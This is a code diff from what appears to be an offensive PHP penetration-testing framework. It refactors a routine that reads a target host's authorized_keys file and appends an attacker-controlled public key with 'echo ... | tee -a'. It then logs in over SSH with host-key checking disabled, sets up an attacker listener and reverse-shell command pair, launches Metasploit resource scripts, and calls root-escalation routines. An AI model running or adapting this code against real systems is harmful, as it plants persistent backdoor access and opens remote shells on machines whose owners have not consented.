@@ -133,36 +133,16 @@ class SERVICE4COM extends AUTH {
        
         if (!empty($authorized_keys_filepath)){
             
-            $query = "cat $authorized_keys_filepath";
-            $result .= $this->req_str($stream,$query,$this->stream_timeout);
-            $this->pause();
-            
-            
-            if(stristr($authorized_keys_str,$public_keys_str)!==FALSE) {
-                $this->log2succes("FOUND Public key - already exist",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"$authorized_keys_str","");
-                echo "Public key already exist\n";
-                $result .= "Public key already exist\n";
-            }
-            else {
-                echo "Public key added\n";
-                $data = " echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath";
-                $result .= $this->req_str($stream,$data,$this->stream_timeout);
-                $data = " echo '$public_keys_str' | tee -a $authorized_keys_filepath";
-                $result .= $this->req_str($stream,$data,$this->stream_timeout);
-                
-            }
-            $this->pause();
+            if ($this->keys4check($stream, $authorized_keys_filepath, $public_keys_str)!==FALSE){
             
             $ssh_open = $this->ip2port4service("ssh");
             if(!empty($ssh_open)) {
-                $ip2users2shell = $this->ip2users4shell();
-                foreach ($ip2users2shell as $username){
-                    $username = trim($username);
-                    $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $username, $private_key_ssh_rsa_file,"");
+
+                $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $local_username, $private_key_ssh_rsa_file,"");
                 if(is_resource($stream)){
                     $info = "SSH Private Key:$private_key_ssh_rsa_file";
                     $this->log2succes($info, __FILE__, __CLASS__, __FUNCTION__, __LINE__, $info, "");
-                    $template_shell = "ssh -i $private_key_ssh_rsa_file -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $username@$this->ip -p $ssh_open -C  '%SHELL%'";
+                    $template_shell = "ssh -i $private_key_ssh_rsa_file -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $local_username@$this->ip -p $ssh_open -C  '%SHELL%'";
                     $templateB64_shell = base64_encode($template_shell);
                     $attacker_ip = $this->ip4addr4target($this->ip);
                     $attacker_port = rand(1024,65535);
@@ -174,19 +154,60 @@ class SERVICE4COM extends AUTH {
                     $type = "server";
                     $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
                 }
-            }
+            
             }
             
         }
-        $this->pause();
-        
+
+        }
         return $result;
     }
     
     
+    public function keys4check($stream,$authorized_keys_filepath,$key2search):bool{
+        $this->ssTitre(__FUNCTION__);
+        if (!is_resource($stream))  {
+            $this->log2error("Failed Stream",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"$authorized_keys_str","");
+            return FALSE ;
+        }
+        $query = "cat $authorized_keys_filepath";
+        $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout));
+        $this->pause();
+        
+        
+        if(stristr($authorized_keys_str,$key2search)!==FALSE) {
+            $this->log2succes("FOUND Public key - already exist",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"$authorized_keys_str","");
+            return TRUE ;
+        }
+        else {
+            $chaine = "Add Public key\n";
+            $this->rouge($chaine);
+            $data = " echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath";
+            $this->req_str($stream,$data,$this->stream_timeout);
+            $data = " echo '$key2search' | tee -a $authorized_keys_filepath";
+            $this->req_str($stream,$data,$this->stream_timeout);
+            $this->pause();
+            $query = "cat $authorized_keys_filepath";
+            $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout));
+            $this->pause();
+            if(stristr($authorized_keys_str,$key2search)!==FALSE) {
+                $this->log2succes("Succes ADD Keys",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"$authorized_keys_str","");
+                return TRUE ;
+            }
+            else {
+                $this->log2error("Failed to ADD Keys",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"$authorized_keys_str","");
+                return FALSE ;
+            }
+        }
+        
+    }
+    
     public function service4lan($cmd_rev,$templateB64_shell,$lport,$lprotocol,$type){
         $templateB64_cmd = base64_encode(str_replace("%SHELL%", "%CMD%", base64_decode($templateB64_shell)));
-        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol $templateB64_cmd $templateB64_shell $type 30 listening_Server\" ";
+        $cmd1 = "php pentest.php LAN '$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol $templateB64_cmd $templateB64_shell $type 30 listening_Server' ";
+        $this->article("cmd1", $cmd1);
+        $this->article("cmd2", $cmd_rev);
+        
         $time = $this->stream_timeout*3 ;       
         if ($type=="client") $this->exec_parallel($cmd_rev, $cmd1, $time);
         if ($type=="server") $this->exec_parallel($cmd1, $cmd_rev, $time);
@@ -236,8 +257,8 @@ class SERVICE4COM extends AUTH {
         $cmd1 = "msfconsole -q -y /usr/share/metasploit-framework/config/database.yml -r $exploit_rc  2> /dev/null ";
         $cmd2 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol ".base64_encode($template)." server 30 listening_Server\" ";
         
-        if ($type=="client") $this->requette("php parallel.php \"$cmd1\" \"$cmd2\" \"5\" ");
-        if ($type=="server") $this->requette("php parallel.php \"$cmd2\" \"$cmd1\" \"5\" ");
+        if ($type=="client") $this->exec_parallel($cmd1, $cmd2, 5); 
+        if ($type=="server") $this->exec_parallel($cmd2, $cmd1, 5); 
     }
     
     
@@ -466,7 +487,6 @@ class SERVICE4COM extends AUTH {
                     
                     
                     $obj_lan = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
-                    //$obj_lan->lan2pentest8id($template_id);
                     $obj_lan->poc($this->flag_poc);
                     $obj_lan->lan4root();
                     break ;
